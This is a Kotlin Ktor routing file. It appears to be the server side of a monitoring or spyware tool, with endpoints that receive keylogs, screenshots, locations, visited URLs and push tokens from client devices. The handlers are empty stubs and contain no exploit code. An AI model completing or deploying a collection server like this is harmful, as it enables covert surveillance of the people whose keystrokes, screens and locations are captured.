package ehea.plugins

import ehea.models.KeyLog
import ehea.models.Location
import ehea.models.PushToken
import ehea.models.Screenshot
import ehea.printError
import io.ktor.server.routing.*
import io.ktor.http.*
import io.ktor.server.http.content.*
import io.ktor.server.application.*
import io.ktor.server.response.*
import io.ktor.server.request.*

fun Application.configureRouting() {

    routing {
        try {
            get("/sendpushtoken") {
                val pushToken = call.receive<PushToken>()
            }

            get("/sendlocation") {
                val location = call.receive<Location>()
            }

            get("/sendurl") {
                val url = call.receive<Url>()
            }

            get("/sendscreenshot") {
                val screenshot = call.receive<Screenshot>()
            }

            get("/sendkeylog") {
                val keyLog = call.receive<KeyLog>()
            }

            // Static plugin. Try to access `/static/index.html`
            static("/static") {
                resources("static")
            }
        }
        catch (e: Exception) {
            printError(e.message.toString())
        }
    }

}
